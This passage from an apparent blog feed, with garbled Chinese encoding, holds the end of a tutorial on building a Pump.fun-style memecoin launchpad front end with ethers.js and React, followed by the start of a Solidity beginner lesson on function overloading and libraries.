åˆ°é…ç½®ç¯å¢ƒä¸­ï¼Œåœ°å€ä¸º<code>0x5FbDB2315678afecb367f032d93F642f64180aa3</code>ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151249055.png" alt="image-20250217151249055"></p><p>è¿æ¥metamaské’±åŒ…</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="title class_">BrowserProvider</span>(<span class="variable language_">window</span>.<span class="property">ethereum</span>);</span><br><span class="line"><span class="title function_">setProvider</span>(provider);</span><br></pre></td></tr></table></figure><p>è·å–ç½‘ç»œå’Œåˆçº¦çš„åœ°å€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> network = <span class="keyword">await</span> provider.<span class="title function_">getNetwork</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;chainId:&quot;</span>,network.<span class="property">chainId</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>, config[network.<span class="property">chainId</span>].<span class="property">factory</span>.<span class="property">address</span>);</span><br><span class="line"><span class="comment">//address,abi,signerOrProvider</span></span><br><span class="line"><span class="keyword">const</span> factory = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(config[network.<span class="property">chainId</span>].<span class="property">factory</span>.<span class="property">address</span>,<span class="title class_">Factory</span>,provider);</span><br><span class="line"><span class="title function_">setFactory</span>(factory);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;factory:&quot;</span>,factory);</span><br><span class="line"><span class="keyword">const</span> fee = <span class="keyword">await</span> factory.<span class="title function_">fee</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fee:&quot;</span>,fee);</span><br><span class="line"><span class="title function_">setFee</span>(fee);</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151435573.png" alt="image-20250217151435573"></p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151912945.png" alt="image-20250217151912945"></p><p>åœ¨é¡µé¢ç¬¬ä¸€æ¬¡åŠ è½½æ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œ<code>loadBlockchainData</code>å‡½æ•°ï¼ŒåŠ è½½é’±åŒ…ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">loadBlockchainData</span>();</span><br><span class="line">&#125;,[])</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºToken-2">åˆ›å»ºToken</h3><p>åœ¨<code>List.js</code>ä¸­ï¼Œç¼–å†™ä¸€ä¸ªè¡¨å•æäº¤ï¼Œè¾“å…¥<code>token</code>çš„åç§°å’Œç¬¦å·ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">listHandler</span>(<span class="params">form</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> name = form.<span class="title function_">get</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> ticker = form.<span class="title function_">get</span>(<span class="string">&quot;ticker&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(signer).<span class="title function_">create</span>(name, ticker, &#123;<span class="attr">value</span>: fee&#125;);</span><br><span class="line">    <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;submitted...&quot;</span>,name ,ticker);</span><br><span class="line">    <span class="title function_">toggleCreate</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¡¨å•çš„htmlä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>list new token<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;list_description&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>fee: &#123;ethers.formatEther(fee, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;listHandler&#125;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ticker&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;ticker&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ list ]&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggleCreate&#125;</span> <span class="attr">className</span>=<span class="string">&quot;btn--fancy&quot;</span>&gt;</span> [ cancel ] <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217160659358.png" alt="image-20250217160659358"></p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217160630715.png" alt="image-20250217160630715"></p><h3 id="åˆ—å‡ºToken">åˆ—å‡ºToken</h3><p>ä½¿ç”¨<code>factory</code>å¯¹è±¡è·å–å·²ç»åˆ›å»ºçš„<code>token</code>æ€»æ•°<code>totalToken</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–tokençš„æ€»æ•°é‡</span></span><br><span class="line"><span class="keyword">const</span> totalToken = <span class="keyword">await</span> factory.<span class="title function_">totalTokens</span>();</span><br><span class="line"><span class="keyword">const</span> tokens = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; totalToken; i++)&#123;</span><br><span class="line">  <span class="keyword">const</span> tokenToSale = <span class="keyword">await</span> factory.<span class="title function_">getTokenSale</span>(i);</span><br><span class="line">  <span class="comment">//è¾“å‡ºåˆ›å»ºçš„tokençš„ä¿¡æ¯</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(tokenToSale);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> token = &#123;</span><br><span class="line">    <span class="attr">token</span>: tokenToSale.<span class="property">token</span>,</span><br><span class="line">    <span class="attr">name</span>: tokenToSale.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">creator</span>: tokenToSale.<span class="property">creator</span>,</span><br><span class="line">    <span class="attr">sold</span>: tokenToSale.<span class="property">sold</span>,</span><br><span class="line">    <span class="attr">raised</span>: tokenToSale.<span class="property">raised</span>,</span><br><span class="line">    <span class="attr">isOpen</span>: tokenToSale.<span class="property">isOpen</span>,</span><br><span class="line">    <span class="attr">image</span>: images[i]</span><br><span class="line">  &#125;</span><br><span class="line">  tokens.<span class="title function_">push</span>(token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setTokens</span>(tokens.<span class="title function_">reverse</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tokens:&quot;</span>,tokens);</span><br></pre></td></tr></table></figure><p>åœ¨<code>Token.js</code>ä¸­è¿›è¡Œå‰ç«¯å±•ç¤º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Token</span>(<span class="params">&#123; toggleTrade, token &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> toggleTrade(token)&#125; className=&quot;token&quot;&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;token_details&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;token.image&#125;</span> <span class="attr">alt</span>=<span class="string">&quot;token image&quot;</span> <span class="attr">width</span>=<span class="string">&#123;256&#125;</span> <span class="attr">height</span>=<span class="string">&#123;256&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>creator by &#123;token.creator.slice(0,6) + &#x27;...&#x27; + token.creator.slice(38,42)&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>market Cap: &#123;ethers.formatEther(token.raised, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;token.name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Token</span>;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217153634506.png" alt="image-20250217153634506"></p><p>ç•Œé¢å±•ç¤º</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154119339.png" alt="image-20250217154119339"></p><h3 id="è´­ä¹°Token">è´­ä¹°Token</h3><p>åœ¨<code>Trade.js</code>ä¸­ï¼Œè´­ä¹°<code>token</code>çš„jsä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [target, setTarget] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> [limit, setLimit] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> [cost, setCost] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">buyHandler</span>(<span class="params">form</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> amount = form.<span class="title function_">get</span>(<span class="string">&quot;amount&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(token.<span class="property">sold</span>);</span><br><span class="line">  <span class="keyword">const</span> totalCost = cost * <span class="title class_">BigInt</span>(amount);</span><br><span class="line">  <span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line">  <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(signer).<span class="title function_">buy</span>(</span><br><span class="line">    token.<span class="property">token</span>,</span><br><span class="line">    ethers.<span class="title function_">parseUnits</span>(amount, <span class="number">18</span>),</span><br><span class="line">    &#123;<span class="attr">value</span>: totalCost&#125;</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">  <span class="title function_">toggleTrade</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getSaleDetails</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> target = <span class="keyword">await</span> factory.<span class="title function_">TARGET</span>();</span><br><span class="line">  <span class="title function_">setTarget</span>(target);</span><br><span class="line">  <span class="keyword">const</span> limit = <span class="keyword">await</span> factory.<span class="title function_">TOKEN_LIMIT</span>();</span><br><span class="line">  <span class="title function_">setLimit</span>(limit);</span><br><span class="line">  <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(token.<span class="property">sold</span>);</span><br><span class="line">  <span class="title function_">setCost</span>(cost);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">getSaleDetails</span>();</span><br><span class="line">&#125;, [token]);</span><br></pre></td></tr></table></figure><p>è´­ä¹°<code>token</code>çš„htmlä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;trade&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>trade<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>  <span class="attr">className</span>=<span class="string">&quot;trade_details&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;token.name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>creator: &#123;token.creator.slice(0,6) + &#x27;...&#x27; + token.creator.slice(38,42)&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;token.image&#125;</span> <span class="attr">alt</span>=<span class="string">&quot;token image&quot;</span> <span class="attr">width</span>=<span class="string">&#123;256&#125;</span> <span class="attr">height</span>=<span class="string">&#123;256&#125;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>marketcap: &#123;ethers.formatEther(token.raised, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>base cost: &#123;ethers.formatEther(cost, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;token.sold &gt;= limit || token.raised &gt;= target ? (</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;disclaimer&quot;</span>&gt;</span>target reached!!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  ) : (</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;buyHandler&#125;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">min</span>=<span class="string">&#123;1&#125;</span> <span class="attr">max</span>=<span class="string">&#123;10000&#125;</span> <span class="attr">placeholder</span>=<span class="string">&quot;amount&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ buy ]&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  ) </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggleTrade&#125;</span> <span class="attr">className</span>=<span class="string">&quot;btn--fancy&quot;</span>&gt;</span> [ cancel ] <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&lt;/div &gt;</span><br></pre></td></tr></table></figure><p>ç•Œé¢å±•ç¤ºï¼š</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217161106789.png" alt="image-20250217161106789"></p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://www.youtube.com/watch?v=z7Vz8ZKylc4">https://www.youtube.com/watch?v=z7Vz8ZKylc4</a></p><p><a href="https://www.openzeppelin.com/">https://www.openzeppelin.com/</a></p><p><a href="https://github.com/dappuniversity/fun-pump">https://github.com/dappuniversity/fun-pump</a></p><p><a href="https://docs.ethers.org/v5/api/contract/contract/">https://docs.ethers.org/v5/api/contract/contract/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»¥å¤ªåŠ </tag>
            
            <tag> Solidity </tag>
            
            <tag> Blockchain </tag>
            
            <tag> hardhat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidityå…¥é—¨å­¦ä¹ (ä¸‰)</title>
      <link href="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/"/>
      <url>/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="é‡è½½">é‡è½½</h2><p><code>Solidity</code>ä¸­å…è®¸å‡½æ•°è¿›è¡Œé‡è½½ï¼ˆ<code>overloading</code>ï¼‰ï¼Œå³åå­—ç›¸åŒä½†è¾“å…¥å‚æ•°ç±»å‹ä¸åŒçš„å‡½æ•°å¯ä»¥åŒæ—¶å­˜åœ¨ï¼Œä»–ä»¬è¢«è§†ä¸ºä¸åŒçš„å‡½æ•°ã€‚æ³¨æ„ï¼Œ<strong><code>Solidity</code>ä¸å…è®¸ä¿®é¥°å™¨ï¼ˆ<code>modifier</code>ï¼‰é‡è½½ã€‚</strong></p><p>æµ‹è¯•ä»£ç <code>Overloading.sol</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Overloading&#123;</span><br><span class="line">    function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">        return (&quot;Nothing&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function saySomething(string memory something) public pure returns (string memory) &#123;</span><br><span class="line">        return(something);</span><br><span class="line">    &#125;</span><br><span class="line">    function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">        out = _in;</span><br><span class="line">    &#125;</span><br><span class="line">    function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">        out = _in;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°é‡è½½">å‡½æ•°é‡è½½</h3><p>æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸¤ä¸ªéƒ½å«<code>saySomething()</code>çš„å‡½æ•°ï¼Œä¸€ä¸ªæ²¡æœ‰ä»»ä½•å‚æ•°ï¼Œè¾“å‡º<code>&quot;Nothing&quot;</code>ï¼›å¦ä¸€ä¸ªæ¥æ”¶ä¸€ä¸ª<code>string</code>å‚æ•°ï¼Œè¾“å‡ºè¿™ä¸ª<code>string</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">        return (&quot;Nothing&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function saySomething(string memory something) public pure returns (string memory) &#123;</span><br><span class="line">        return(something);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆé‡è½½å‡½æ•°åœ¨ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘åï¼Œç”±äºä¸åŒçš„å‚æ•°ç±»å‹ï¼Œéƒ½å˜æˆäº†ä¸åŒçš„å‡½æ•°é€‰æ‹©å™¨ï¼ˆselectorï¼‰ã€‚</p><p>ä»¥ <code>Overloading.sol</code> åˆçº¦ä¸ºä¾‹ï¼Œåœ¨ Remix ä¸Šç¼–è¯‘éƒ¨ç½²åï¼Œåˆ†åˆ«è°ƒç”¨é‡è½½å‡½æ•° <code>saySomething()</code> å’Œ <code>saySomething(string memory something)</code>ï¼Œå¯ä»¥çœ‹åˆ°ä»–ä»¬è¿”å›äº†ä¸åŒçš„ç»“æœï¼Œè¢«åŒºåˆ†ä¸ºä¸åŒçš„å‡½æ•°ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204032523893.png" alt="image-20250204032523893"></p><h3 id="å‚æ•°åŒ¹é…ï¼ˆArgument-Matchingï¼‰">å‚æ•°åŒ¹é…ï¼ˆArgument Matchingï¼‰</h3><p>åœ¨è°ƒç”¨é‡è½½å‡½æ•°æ—¶ï¼Œä¼šæŠŠè¾“å…¥çš„å®é™…å‚æ•°å’Œå‡½æ•°å‚æ•°çš„å˜é‡ç±»å‹åšåŒ¹é…ã€‚ å¦‚æœå‡ºç°å¤šä¸ªåŒ¹é…çš„é‡è½½å‡½æ•°ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­æœ‰ä¸¤ä¸ªå«<code>f()</code>çš„å‡½æ•°ï¼Œä¸€ä¸ªå‚æ•°ä¸º<code>uint8</code>ï¼Œå¦ä¸€ä¸ªä¸º<code>uint256</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">    out = _in;</span><br><span class="line">&#125;</span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">    out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è°ƒç”¨<code>f(50)</code>ï¼Œå› ä¸º<code>50</code>æ—¢å¯ä»¥è¢«è½¬æ¢ä¸º<code>uint8</code>ï¼Œä¹Ÿå¯ä»¥è¢«è½¬æ¢ä¸º<code>uint256</code>ï¼Œå› æ­¤ä¼šæŠ¥é”™ã€‚</p><h2 id="åº“åˆçº¦">åº“åˆçº¦</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ç”¨<code>ERC721</code>çš„å¼•ç”¨çš„åº“åˆçº¦<code>Strings</code>ä¸ºä¾‹ä»‹ç»<code>Solidity</code>ä¸­çš„åº“åˆçº¦ï¼ˆ<code>Library</code>ï¼‰ï¼Œå¹¶æ€»ç»“äº†å¸¸ç”¨çš„åº“åˆçº¦ã€‚</p><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>Library.sol</code>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 